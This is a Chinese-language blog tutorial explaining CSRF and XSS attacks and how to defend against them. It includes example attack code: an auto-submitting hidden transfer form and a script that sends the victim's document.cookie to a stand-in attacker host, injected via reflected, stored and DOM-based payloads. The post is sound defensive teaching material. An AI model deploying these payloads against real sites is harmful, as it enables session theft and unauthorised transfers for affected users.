Title: CSRF攻击和XSS攻击
Date: 2018-11-27 23:59:46
Category: 技术
Tag: 安全
============================================================
### CSRF
>CSRF，全称Cross-site request forgery（跨站请求伪造），其原理是利用用户的身份，执行非用户本身意愿的操作(隐式身份验证机制)。
<!--more-->
#### 形式
图片URL、超链接、Form提交等，也可以嵌入到第三方论坛、文章中等地方。

#### 危害
攻击者可以盗用用户的身份，以用户的名义进行恶意操作，包括但不限于以用户的名义发送邮件、资金转账、网上等危害用户的操作

#### 原理

![CSRF攻击](https://kirako-1253293746.cos.ap-chengdu.myqcloud.com/CSRF%E6%94%BB%E5%87%BB.pngCSRF%E6%94%BB%E5%87%BB.png?q-sign-algorithm=sha1&q-ak=AKIDBbUtX5sstztuoUafjFbj4fga7jJv6qop&q-sign-time=1543368820;1543370620&q-key-time=1543368820;1543370620&q-header-list=&q-url-param-list=&q-signature=92d0756bf98fdd7e3d5ec980617d69a9c7328f71&x-cos-security-token=01bdc2393eacf64d06aed42b934b056a4cb2afc410001)

假定受信的站点A是`http://example.org`，恶意站点B是`http://hacker.org`

1. 用户访问并登陆`http://example.org`；
2. 站点A生成并返回Cookie给用户；
3. 用户点击恶意网站B`http://hacker.org`提供的图片链接`< img src="http://example.org/transfer?amount=10&for=hacker">`（或者包含该图片的链接地址），如果此时站点A的Cookie未过期，那么浏览器就会带上Cookie并向站点A发起`http://example.org?amount=10&for=hacker`请求；
4. 由于发起请求带有用户的Cookie，站点A通过授信并进行相关的操作，造成相关损失。

上面使用的是通过`GET`请求冒用用户发起请求，不仅`GET`请求，`POST`也没法防止`CSRF`攻击，下面是一个自动提交表单的`CSRF`攻击。

```
<form action="http://example.org/transfer" method="POST">
    <input type="hidden" name="amount" value="10">
    <input type="hidden" name="for" value="hacker">
</form>
<script>document.forms[0].submit()</script>
```
用户在打开这个页面后，该表单请求会自动提交，相当于用户自己进行了一次POST请求。

####防御
##### 1.验证码
>最有效的防御方法

CSRF的原理是**在用户毫不知情的情况下发起了网络请求**，而验证码强制用户要与应用进行交互，才能提交请求。
但处处使用验证码对于用户来说是一件体验很差的事情。

##### 2.检验请求头部Refer字段
>Refer用来记录该HTTP请求的来源地址

通过Refer可以保证用户的请求来自我们相信的页面地址。但是，Refer字段是由用户浏览器提供的，不同的浏览器实现各有差异，并且有些浏览器处于保护用户隐私，并不会发送Rfer字段。
因此使用Refer字段来防御CSRF有一定的限制，但从该字段可以用来监控CSRF攻击的发生。

##### 3.CSRF Token

CSRF之所以能够成功，是因为**攻击者知道攻击所需要的所有参数，因此能够构造完整请求**，因此服务器会把攻击者的请求误认为是用户发起的请求。
那么如果每次请求都让用户带上一个攻击者无法获取到的随机数，那么攻击者就无法构造完全的请求，服务器也能将攻击者的请求和用户的请求给区分开，这就是`CSRF Token`。

CSRF Token的过程：
1. 服务器生成随机数Token（该随机数生成方法要足够安全），并将该随机Token保存在用户Session（或Cookie中）；
2. 同时，服务器在生成表单提交页面的同时，需要将改Token嵌入到表单DOM（通常作为一个隐藏的input标签值，如`<input type="hidden" name="_csrf_token" value="xxxx">`）中；
3. 用户在提交表单时，该Token会随着表单数据一起提交到服务器，服务器检测提交的Token是否与用户Session（或Cookie）中的是否一致，如果不一致或者为空，则表示非法请求；否则认为是一个合法请求。

由于攻击者得到该随机Token，因此无法构造完整请求，所以可以用来防止CSRF攻击。**但是如果网站存在XSS攻击，那么该防范方法会失效，因为攻击者可以获取到用户的Cookie，从而构造完成的请求，这个过程称为XSRF。**使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以Form或AJAX形式提交，避免Token泄露。

CSRF是代替用户完成指定的动作，不直接窃取用户数据，而是代替用户发起请求，但需要知道其他用户页面的代码和数据包。

### XSS攻击
>XSS, 全称是Cross site script，即跨站脚本，为了避免与CSS，因此简称XSS

#### 形式
利用网站对用户输入没有进行限制或过滤，从而在页面中嵌入某些代码，当别的用法访问到该网页时，会执行对应的代码，从而使得攻击者可以获取

#### 危害
由于Cookie已经被攻击者获取，因此攻击可以登录账号，进行相关操作，如更改信息、转账、删除数据等敏感操作。

#### 原理
主要原因：太过于新人用户的输入

##### 反射型XSS攻击
>最常见的XSS请求攻击，将XSS攻击代码放在链接上，由用户点击触发使服务器返回XSS攻击代码，并在客户端执行，从而发起Web攻击。

![反射型XSS攻击](https://kirako-1253293746.cos.ap-chengdu.myqcloud.com/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB.png)

`http://example.org?search=hello,world`：
对于该请求，服务器会将`hello,world`回显到页面中返回给客户端，客户端会显示`hello,world`。

`http://example.org?search=<script>alter('I get you!')</script>`：
对于该请求，如果服务器对输入没有进行任何处理，那么对于，那么js代码`<script>alter('I get you!')</script>`会嵌入到页面中，客户端再渲染页面的时候回执行该js代码，并弹出alter框。

`http://example.org?search=<script>src='http://hacker.com/xss.js'</script>`

```
//xss.js
var img = document.createElement('img');
img.width = 0;
img.height = 0;
img.src = 'http://hacker.org/xss?cookie='+encodeURIComponent(document.cookie);
```

这样将用户在点击上述连接的时候，浏览器会自动引入`xss.js`文件，并执行其中js语句，里面的js语句会读取用户Cookie，并将其作为参数访问Get请求的页面，然后Cookie就会发送给攻击者。

###### 存储型XSS攻击
>与发射型不同的是，存储型XSS攻击的攻击代码是存在在网站数据库，当包含该攻击代码的页面被用户打开时，该脚本会自动运行，将打开该网页的所有用户的Cookie发送给攻击者。

![存储型XSS攻击](https://kirako-1253293746.cos.ap-chengdu.myqcloud.com/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB.png)

假设有一个论坛允许用户留言并且对用户的输入不进行处理，那么攻击者在该网站的某个帖子下面留以下信息。

```
哈哈哈，有趣有趣
<script>src='http://hacker.com/xss.js'</script>
```

网站将该留言存储到数据库，那么之后每个在访问包含上述留言的用户的Cookie都会被发往攻击者。

###### Dom Based XSS
>这种类型的攻击与反射型有点类似，区别在于用户的输入并不是由服务器来返回，主要是由客户端通过DOM动态的输出数据到页面，从客户端获得DOM的数据在本地执行。

```
<HTML>
<TITLE>Welcome!</TITLE>
Hi
<SCRIPT>
var pos=document.URL.indexOf("name=")+5;
document.write(document.URL.substring(pos,document.URL.length));
</SCRIPT>
<BR>
Welcome to our system
…
</HTML>
```

该页面中的某些数据是从URL中解析的，比如下面的一个请求`http://hacker.org/welcome.html?name=<script>src='http://hacker.com/xss.js'</script>`。用户在点击这个请求的时候，本地浏览器回从URL中获取name属性并填充到HTML中，从而引起XSS攻击。



#### 防御
主要解决方案：不信任用户输入的所有数据

1. 设置Cookie的属性为`Http only`，这样js就无法获取Cookie值；
2. 严格检查表单提交的类型，并且后端服务一定要做，不能信任前段的数据；
3. 对用户提交的数据就行`Html encode`处理，将其转化为HTML实体字符的普通文本；
4. 过滤或移除特殊的HTML标签，如`<script>`、`<iframe>`等；
5. 过滤js事件的标签，如`onclick=`、`onfoucs=`等、


#### Refer
1. [白帽子讲Web安全（纪念版）](https://item.jd.com/11483966.html)
2. [浅谈CSRF攻击方式](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
3. [Web安全相关（二）：跨站请求伪造（CSRF/XSRF）](https://www.cnblogs.com/Erik_Xu/p/5481441.html)
4. [CSRF 攻击的应对之道](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/)
5. [XSS跨站脚本攻击](https://www.cnblogs.com/phpstudy2015-6/p/6767032.html)
6. [【web安全】第一弹：利用xss注入获取cookie](https://www.cnblogs.com/adelaide/articles/6035015.html)

